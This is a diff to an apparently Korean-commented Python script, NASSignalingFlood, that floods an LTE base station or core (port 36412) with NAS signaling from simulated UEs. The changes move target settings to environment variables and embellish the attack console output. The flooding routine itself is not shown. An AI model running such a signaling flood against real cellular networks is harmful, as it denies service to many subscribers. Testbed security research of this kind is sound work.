@@ -12,9 +12,11 @@ import random
 import hashlib
 
 class NASSignalingFlood:
-    def __init__(self, target_ip, target_port=36412, num_ues=1000):
-        self.target_ip = target_ip
-        self.target_port = target_port
+    def __init__(self, num_ues=1000):
+        # 환경변수에서 설정 읽기
+        import os
+        self.target_ip = os.getenv('ENB_IP')
+        self.target_port = int(os.getenv('ENB_RX_PORT'))
         self.num_ues = num_ues
         self.attack_threads = []
         self.running = False
@@ -88,10 +90,14 @@ class NASSignalingFlood:
     
     def start_attack(self, duration=60):
         """공격 시작"""
-        print(f"NAS Signaling Flood 공격 시작...")
-        print(f"대상: {self.target_ip}:{self.target_port}")
-        print(f"UE 수: {self.num_ues}")
-        print(f"지속 시간: {duration}초")
+        print(f"\n{'='*60}")
+        print(f"📡 NAS Signaling Flood 공격 시작")
+        print(f"{'='*60}")
+        print(f"🎯 대상: {self.target_ip}:{self.target_port}")
+        print(f"👥 UE 수: {self.num_ues}")
+        print(f"⏱️  지속 시간: {duration}초")
+        print(f"🕐 시작 시간: {time.strftime('%Y-%m-%d %H:%M:%S')}")
+        print(f"{'='*60}")
         
         self.running = True
         
@@ -123,15 +129,12 @@ class NASSignalingFlood:
         print("공격 완료")
 
 def main():
-    # 공격 대상 설정
-    target_ip = "127.0.0.1"  # 클라우드 환경에서는 실제 IP로 변경
-    target_port = 36412
-    
     # 공격 파라미터
     num_ues = 300
     duration = 120
     
-    attack = NASSignalingFlood(target_ip, target_port, num_ues)
+    # 공격 실행 (환경변수에서 설정 자동 읽기)
+    attack = NASSignalingFlood(num_ues)
     
     try:
         attack.start_attack(duration)
